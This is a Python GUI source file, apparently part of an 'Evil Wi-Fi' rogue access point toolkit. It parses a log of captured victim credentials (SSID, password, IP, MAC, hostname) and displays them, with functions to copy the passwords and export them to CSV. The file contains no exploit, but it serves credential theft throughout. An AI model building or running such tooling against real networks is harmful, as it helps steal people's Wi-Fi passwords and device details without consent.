#!/usr/bin/env python3
"""
Evil Wi-Fi — Credential Viewer GUI
===================================
Opens logs/credentials.log and displays captured credentials in a
sortable, dark-themed table.

Run (no root required):
  python3 gui_viewer.py
  python3 gui_viewer.py /path/to/custom/credentials.log
"""

import csv
import os
import re
import sys
import tkinter as tk
from datetime import datetime
from tkinter import filedialog, messagebox, ttk

DEFAULT_LOG = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'logs', 'credentials.log')

# ── Color palette (Catppuccin Mocha) ─────────────────────────────────────────
BG = '#1e1e2e'
SURFACE = '#313244'
SURFACE_ALT = '#292940'
OVERLAY = '#45475a'
TEXT = '#cdd6f4'
SUBTEXT = '#a6adc8'
BLUE = '#89b4fa'
GREEN = '#a6e3a1'
RED = '#f38ba8'
YELLOW = '#f9e2af'
HEADER_BG = '#181825'

COLUMNS = ('Time', 'SSID', 'Password', 'IP', 'MAC', 'Hostname')
COL_WIDTHS = (155, 160, 175, 110, 140, 155)


# ── Log parser ────────────────────────────────────────────────────────────────

def parse_log(path: str) -> list[dict]:
    if not os.path.exists(path):
        return []
    with open(path, encoding='utf-8', errors='replace') as f:
        content = f.read()
    entries = []
    for block in re.split(r'─{10,}', content):
        block = block.strip()
        if not block:
            continue
        entry: dict[str, str] = {}
        ts = re.search(r'\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]', block)
        if ts:
            entry['Time'] = ts.group(1)
        for field in ('SSID', 'Password', 'IP', 'MAC', 'Hostname'):
            m = re.search(rf'{field}:\s*(.+)', block)
            entry[field] = m.group(1).strip() if m else ''
        if entry.get('Time') or entry.get('Password'):
            entries.append(entry)
    return entries


# ── Main window ───────────────────────────────────────────────────────────────

class CredentialViewer:
    def __init__(self, root: tk.Tk, log_path: str):
        self.root = root
        self.log_path = log_path
        self._sort_col = 'Time'
        self._sort_asc = False
        self._auto_refresh = tk.BooleanVar(value=False)
        self._after_id: str | None = None
        self._filter_var = tk.StringVar()
        self._filter_var.trace_add('write', lambda *_: self._load())

        self._build_ui()
        self._load()

    # ── UI construction ───────────────────────────────────────────────────────

    def _build_ui(self) -> None:
        self.root.title('Evil Wi-Fi — Captured Credentials')
        self.root.geometry('1020x560')
        self.root.configure(bg=BG)
        self.root.minsize(720, 360)

        self._apply_style()
        self._build_header()
        self._build_table()
        self._build_footer()

    def _apply_style(self) -> None:
        s = ttk.Style(self.root)
        s.theme_use('clam')
        s.configure('Treeview',
                    background=SURFACE,
                    foreground=TEXT,
                    fieldbackground=SURFACE,
                    rowheight=30,
                    font=('Consolas', 10))
        s.configure('Treeview.Heading',
                    background=HEADER_BG,
                    foreground=BLUE,
                    font=('Consolas', 10, 'bold'),
                    relief='flat')
        s.map('Treeview',
              background=[('selected', OVERLAY)],
              foreground=[('selected', TEXT)])
        s.map('Treeview.Heading',
              background=[('active', OVERLAY)])
        s.configure('Scrollbar', background=OVERLAY, troughcolor=SURFACE, arrowcolor=TEXT)

    def _build_header(self) -> None:
        bar = tk.Frame(self.root, bg=HEADER_BG, pady=8, padx=14)
        bar.pack(fill=tk.X)

        tk.Label(bar, text='Evil Wi-Fi  |  Captured Credentials',
                 bg=HEADER_BG, fg=BLUE,
                 font=('Consolas', 13, 'bold')).pack(side=tk.LEFT)

        # Filter box
        tk.Label(bar, text='Filter:', bg=HEADER_BG, fg=SUBTEXT,
                 font=('Consolas', 10)).pack(side=tk.RIGHT, padx=(4, 0))
        filter_entry = tk.Entry(bar, textvariable=self._filter_var,
                                bg=SURFACE, fg=TEXT, insertbackground=TEXT,
                                font=('Consolas', 10), relief='flat',
                                width=22, bd=4)
        filter_entry.pack(side=tk.RIGHT, padx=6)

    def _build_table(self) -> None:
        frame = tk.Frame(self.root, bg=BG)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(6, 0))

        self.tree = ttk.Treeview(frame, columns=COLUMNS, show='headings',
                                 selectmode='extended')
        for col, w in zip(COLUMNS, COL_WIDTHS):
            self.tree.heading(col, text=f'  {col}',
                              command=lambda c=col: self._sort(c))
            self.tree.column(col, width=w, minwidth=60, anchor=tk.W)

        vsb = ttk.Scrollbar(frame, orient='vertical', command=self.tree.yview)
        hsb = ttk.Scrollbar(frame, orient='horizontal', command=self.tree.xview)
        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)

        self.tree.grid(row=0, column=0, sticky='nsew')
        vsb.grid(row=0, column=1, sticky='ns')
        hsb.grid(row=1, column=0, sticky='ew')
        frame.rowconfigure(0, weight=1)
        frame.columnconfigure(0, weight=1)

        # Row alternating colors
        self.tree.tag_configure('even', background=SURFACE)
        self.tree.tag_configure('odd', background=SURFACE_ALT)
        # Highlight the password column value on double-click
        self.tree.bind('<Double-1>', self._on_double_click)

    def _build_footer(self) -> None:
        bar = tk.Frame(self.root, bg=HEADER_BG, pady=7, padx=10)
        bar.pack(fill=tk.X, side=tk.BOTTOM)

        btn = dict(bg=BLUE, fg=HEADER_BG, relief='flat',
                   font=('Consolas', 9, 'bold'), padx=10, pady=5,
                   cursor='hand2', activebackground=OVERLAY,
                   activeforeground=TEXT)

        tk.Button(bar, text='Refresh', command=self._load, **btn).pack(side=tk.LEFT, padx=3)
        tk.Button(bar, text='Copy Password', command=self._copy_password, **btn).pack(side=tk.LEFT, padx=3)
        tk.Button(bar, text='Export CSV', command=self._export_csv, **btn).pack(side=tk.LEFT, padx=3)
        tk.Button(bar, text='Clear Log', command=self._clear_log,
                  bg=RED, fg=HEADER_BG, relief='flat',
                  font=('Consolas', 9, 'bold'), padx=10, pady=5,
                  cursor='hand2', activebackground=OVERLAY,
                  activeforeground=TEXT).pack(side=tk.LEFT, padx=3)

        tk.Checkbutton(bar, text='Auto-refresh (5 s)',
                       variable=self._auto_refresh,
                       command=self._toggle_auto,
                       bg=HEADER_BG, fg=SUBTEXT, selectcolor=SURFACE,
                       activebackground=HEADER_BG, activeforeground=TEXT,
                       font=('Consolas', 9)).pack(side=tk.LEFT, padx=12)

        self.status_lbl = tk.Label(bar, text='', bg=HEADER_BG, fg=GREEN,
                                   font=('Consolas', 9))
        self.status_lbl.pack(side=tk.RIGHT, padx=4)

    # ── Data / table helpers ──────────────────────────────────────────────────

    def _load(self) -> None:
        entries = parse_log(self.log_path)
        q = self._filter_var.get().lower().strip()
        if q:
            entries = [e for e in entries if any(q in v.lower() for v in e.values())]
        self._populate(entries)
        n = len(parse_log(self.log_path))
        ts = datetime.now().strftime('%H:%M:%S')
        shown = len(entries)
        self.status_lbl.config(
            text=f'{n} total  •  {shown} shown  •  refreshed {ts}'
        )

    def _populate(self, entries: list[dict]) -> None:
        self.tree.delete(*self.tree.get_children())
        key = self._sort_col
        sorted_entries = sorted(
            entries,
            key=lambda e: e.get(key, ''),
            reverse=not self._sort_asc,
        )
        for i, e in enumerate(sorted_entries):
            tag = 'even' if i % 2 == 0 else 'odd'
            self.tree.insert('', tk.END, iid=str(i),
                             values=tuple(e.get(c, '') for c in COLUMNS),
                             tags=(tag,))

    def _sort(self, col: str) -> None:
        if self._sort_col == col:
            self._sort_asc = not self._sort_asc
        else:
            self._sort_col = col
            self._sort_asc = True
        self._load()

    def _on_double_click(self, event) -> None:
        row = self.tree.identify_row(event.y)
        if not row:
            return
        vals = self.tree.item(row, 'values')
        if not vals:
            return
        pwd = vals[COLUMNS.index('Password')]
        self.root.clipboard_clear()
        self.root.clipboard_append(pwd)
        self.status_lbl.config(text=f'Copied: {pwd}')

    # ── Actions ───────────────────────────────────────────────────────────────

    def _copy_password(self) -> None:
        sel = self.tree.selection()
        if not sel:
            messagebox.showwarning('Nothing selected', 'Select one or more rows first.')
            return
        idx = COLUMNS.index('Password')
        passwords = [self.tree.item(iid, 'values')[idx] for iid in sel]
        self.root.clipboard_clear()
        self.root.clipboard_append('\n'.join(passwords))
        self.status_lbl.config(text=f'Copied {len(passwords)} password(s) to clipboard.')

    def _export_csv(self) -> None:
        path = filedialog.asksaveasfilename(
            defaultextension='.csv',
            filetypes=[('CSV files', '*.csv'), ('All files', '*.*')],
            initialfile='evil_wifi_captures.csv',
        )
        if not path:
            return
        entries = parse_log(self.log_path)
        with open(path, 'w', newline='', encoding='utf-8') as f:
            w = csv.DictWriter(f, fieldnames=COLUMNS, extrasaction='ignore')
            w.writeheader()
            w.writerows(entries)
        messagebox.showinfo('Exported', f'Saved {len(entries)} entries to:\n{path}')

    def _clear_log(self) -> None:
        if not messagebox.askyesno(
            'Clear Log',
            f'Delete all captures from:\n{self.log_path}\n\nThis cannot be undone.',
        ):
            return
        try:
            open(self.log_path, 'w').close()
        except OSError as e:
            messagebox.showerror('Error', str(e))
            return
        self._load()

    # ── Auto-refresh ──────────────────────────────────────────────────────────

    def _toggle_auto(self) -> None:
        if self._auto_refresh.get():
            self._schedule()
        elif self._after_id:
            self.root.after_cancel(self._after_id)
            self._after_id = None

    def _schedule(self) -> None:
        if self._auto_refresh.get():
            self._load()
            self._after_id = self.root.after(5000, self._schedule)


# ── Entry point ───────────────────────────────────────────────────────────────

def main() -> None:
    log = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_LOG
    root = tk.Tk()
    CredentialViewer(root, log)
    root.mainloop()


if __name__ == '__main__':
    main()
